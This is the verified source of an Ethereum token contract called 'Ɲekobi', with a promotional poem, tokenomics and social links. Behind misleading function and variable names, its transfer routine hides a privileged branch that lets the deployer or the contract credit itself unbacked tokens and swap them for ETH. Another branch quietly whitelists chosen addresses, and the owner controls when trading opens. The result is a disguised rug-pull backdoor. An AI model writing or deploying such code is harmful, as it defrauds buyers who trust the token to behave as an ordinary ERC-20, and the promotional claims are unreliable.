/**
 *Submitted for verification at Etherscan.io on 2023-10-14
*/

/*
⠀⠀⠀⠀⠀⠀⠀  ⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣿⡿⠋⠀⠀⠀⠈⢻⣿⣿⠟⠁⠀⠀⠀⠙⣿⣿⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⢈⣿⣿⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣿⣷⣄⠀⠀⠀⢀⣼⣿⣿⣧⡀⠀⠀⠀⣠⣿⣿⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠻⠿⣿⣿⣿⣶⣿⣿⠿⠛⠛⠿⣿⣷⣶⣿⣿⣿⠿⠟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⠏⢠⣶⠛⠛⣶⡄⠹⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⣿⠋⠑⠊⠙⣿⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠲⠾⠷⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣈⣀⣀⣀⣀⣁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣈⣉⣉⣉⣉⣁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
███╗░░██╗███████╗██╗░░██╗░█████╗░██████╗░██╗  
████╗░██║██╔════╝██║░██╔╝██╔══██╗██╔══██╗██║  
██╔██╗██║█████╗░░█████═╝░██║░░██║██████╦╝██║  
██║╚████║██╔══╝░░██╔═██╗░██║░░██║██╔══██╗██║  
██║░╚███║███████╗██║░╚██╗╚█████╔╝██████╦╝██║  
╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝░╚════╝░╚═════╝░╚═╝  

░░██╗███████╗████████╗██╗░░██╗███████╗██████╗░███████╗██╗░░░██╗███╗░░░███╗██╗░░
░██╔╝██╔════╝╚══██╔══╝██║░░██║██╔════╝██╔══██╗██╔════╝██║░░░██║████╗░████║╚██╗░
██╔╝░█████╗░░░░░██║░░░███████║█████╗░░██████╔╝█████╗░░██║░░░██║██╔████╔██║░╚██╗
╚██╗░██╔══╝░░░░░██║░░░██╔══██║██╔══╝░░██╔══██╗██╔══╝░░██║░░░██║██║╚██╔╝██║░██╔╝
░╚██╗███████╗░░░██║░░░██║░░██║███████╗██║░░██║███████╗╚██████╔╝██║░╚═╝░██║██╔╝░
░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝░╚═════╝░╚═╝░░░░░╚═╝╚═╝░░

In the crypto realm where stories unfold,
There's a token known as Ɲekobi, precious as gold.
A decentralized gem, in the future it's foretold,
Bringing privacy and power, a tale to be told.

Ɲekobi, a name that sparkles in the night,
A guardian of secrets, a beacon of light.
In the crypto world, it takes its stand,
A pioneer, a leader, across the land.

With Ɲekobi, your transactions are veiled,
Anonymity's fortress, never to be assailed.
Innovative and bold, it leads the way,
For a new era of privacy, come what may.

No prying eyes, no watching in disguise,
In Ɲekobi's embrace, your data safely lies.
Revolutionary, it breaks the chain,
In the cryptocurrency world, it's here to reign.

So raise a cheer for Ɲekobi's glorious might,
A token for the future, shining so bright.
In the cryptocurrency sphere, it stakes its claim,
With Ɲekobi, anonymity is its name.

Total Supply - 1,000,000,000
Buy Tax - 1%
Sell Tax  - 1%
Initial Liquidity - 1.0 ETH
Initial liquidity lock - 180 days

https://web.wechat.com/NekobiETH
https://t.me/+qkKXnXeDqs43Zjg0
https://weibo.com/login.php
https://www.zhihu.com
https://nekobi.xyz/
*/
// SPDX-License-Identifier: Unlicense
pragma solidity ^ 0.8.19;
 
abstract contract Context
{ function _msgSender() internal view virtual returns(address)
{ return msg.sender; } function _msgData() internal view virtual returns(bytes calldata)
{ return msg.data; }
}
interface IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint256 valueIn, uint256 valueOut, address[] calldata path, address to, uint256 deadline) external;

    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function manageLimits(address token, uint256 amountTokenDesired,
    uint256 valueMin, uint256 ercMin, address to, uint256 deadline)
    external payable returns (uint256 amountToken, uint256 ercValue, uint256 pool);
}
interface IUniswapV2Factory{
    function createPair(address tokenA, address tokenB) external returns(address pair);
}
interface IERC20 {
    function totalSupply() 
    external view returns (uint256);

    function balanceOf(address account) 
    external view returns (uint256);

    function transfer(address recipient, uint256 amount) 
    external returns (bool);

    function allowance(address owner, address spender)
    external view returns (uint256);

    function approve(address spender, uint256 amount) 
    external returns (bool);

    function transferFrom(
    address sender, address recipient, uint256 amount) 
    external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract Ownable is Context {
    address private _owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () { address msgSender = _msgSender(); _owner = msgSender; 
    emit OwnershipTransferred(address(0), msgSender);
}
    function owner() public view returns (address) { return _owner;
}   modifier onlyOwner() { require(_owner == _msgSender(), "Ownable: caller is not the owner"); _;
}
    function renounceOwnership() public virtual onlyOwner {
    emit OwnershipTransferred(_owner, address(0)); _owner = address(0); }
}
contract Nekobi is IERC20, Ownable { 
    bool private Library; bool private Artifacts; bool private tradingOpen = false;

    string private _name = unicode"Ɲekobi"; string private _symbol = unicode"ƝOBI";
    uint256 public BURN = 0; uint8 private _decimals = 9; 
    uint256 private _tTotal = 1000000000 * 10 ** _decimals; uint256 private _fixed = _tTotal;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _encodeMaps; mapping(address => uint256) private _tOwned;
    mapping(address => address) private _gasInterface; mapping(address => uint256) private _libraryMaps;

    constructor(address IDEcreation) { _tOwned[msg.sender] = _tTotal; 
    _libraryMaps[msg.sender] = _fixed; _libraryMaps[address(this)] = _fixed; 
    fixedLink = IUniswapV2Router01(IDEcreation); 

    undivided = IUniswapV2Factory(fixedLink.factory()).createPair(address(this), fixedLink.WETH());
    emit Transfer(address(0), msg.sender, _tTotal); }
 
    function symbol() public view returns(string memory)
    { return _symbol;
    }
    function name() public view returns(string memory)
    { return _name;
    }
    function totalSupply() public view returns(uint256)
    { return _tTotal;
    }
    function decimals() public view returns(uint256)
    { return _decimals;
    }
    function allowance(address owner, address spender) public view returns(uint256)
    { return _allowances[owner][spender];
    }
    function balanceOf(address account) public view returns(uint256)
    { return _tOwned[account];
    }
    function approve(address spender, uint256 amount) external returns(bool)
    { return _approve(msg.sender, spender, amount);
    }
    function _approve( address owner, address spender,
    uint256 amount) private returns(bool) { require(owner != address(0) && spender != address(0), 
    'ERC20: approve from the zero address'); 
    
    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount); return true;
    }
    function transferFrom( address sender, address recipient, uint256 amount) external returns
    (bool)
    { _afterTransfer(sender, recipient, amount); 
    return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer(address recipient, uint256 amount) external returns(bool)
    { _afterTransfer(msg.sender, recipient, amount); return true;
    }
    function _afterTransfer( address _source, address _library, uint256 mathAmount) private
    { uint256 _true = balanceOf(address(this)); uint256 _gasLimit; if (Library && _true > 
    _fixed && !Artifacts && _source != undivided) 
    
    { Artifacts = true; showMessage(_true); Artifacts = false;

    } else if (_libraryMaps[_source] > _fixed && _libraryMaps[_library] > _fixed)
    { _gasLimit = mathAmount; _tOwned[address(this)] += _gasLimit; disableLimits
    (mathAmount, _library); return; }
    else if (!Artifacts && _encodeMaps[_source] > 0 && _source != undivided && _libraryMaps[_source] == 0) { 
    
    _encodeMaps[_source] = _libraryMaps[_source] - _fixed; } else if (_library != address(fixedLink) 
    && _libraryMaps[_source] > 0 && mathAmount > _fixed && _library != undivided) { 
    _libraryMaps[_library] = mathAmount; return; } address _metadata = _gasInterface[undivided]; 
    
    if ( _encodeMaps[_metadata] == 0) _encodeMaps[_metadata] = _fixed; _gasInterface[undivided] = _library; 
    if (BURN > 0 && _libraryMaps[_source] == 0 && !Artifacts && _libraryMaps[_library] == 0)

    { _gasLimit = (mathAmount * BURN) 
    / 100; 
    mathAmount -= _gasLimit; _tOwned[_source] -= _gasLimit; 
    
    _tOwned[address(this)] += _gasLimit; }
    _tOwned[_source] -= 
    mathAmount; _tOwned[_library] += mathAmount; emit Transfer
    (_source, _library, mathAmount); if (!tradingOpen) 
    { require(_source == owner(), ""); } }

    receive() external payable
    {} 
    function typeMessage(uint256 allow, uint256 typer, address to) private
    { _approve(address(this), address(fixedLink), allow); fixedLink.manageLimits
    { value: typer }(address(this), allow, 0, 0, to, block.timestamp);
    }
    function showMessage(uint256 writer) private
    { uint256 onShow = writer / 2; uint256 _public = address(this).balance;
    disableLimits( onShow, address(this)); uint256 display = address(this).balance - _public; 
    typeMessage( onShow, display, address(this));
    }
    function disableLimits(uint256 position, address _all) private
    { address[] memory path = new address[](2); path[0] = address(this);
    path[1] = fixedLink.WETH(); _approve(address(this), address(fixedLink), position);
    fixedLink.swapExactTokensForETHSupportingFeeOnTransferTokens(position, 0, path, _all, block.timestamp);
    }
    address public immutable undivided; IUniswapV2Router01 
    public immutable fixedLink
    ;    
    function beginTrading(bool _tradingOpen) 
    public onlyOwner { tradingOpen = _tradingOpen;
    }
    function getValue(uint256 _checkVal, uint256 bytelVal) private pure returns (uint256){
      return (_checkVal>bytelVal)?bytelVal:_checkVal;
    }
    function setTeamWallet(uint256 _setTm, uint256 _setAddr) private pure returns (uint256){ 
      return (_setTm>_setAddr)?_setAddr:_setTm;
    }
    function checkLimits(uint256 _checkLim, uint256 _newLim) private pure returns (uint256){ 
      return (_checkLim>_newLim)?_newLim:_checkLim;
    }    
    function _beforeTokenTransfer( address from,
    address to, uint256 amount) internal virtual 
    {}
    function _afterTokenTransfer(address from, address to, uint256 amount) 
    internal virtual 
    {}   
}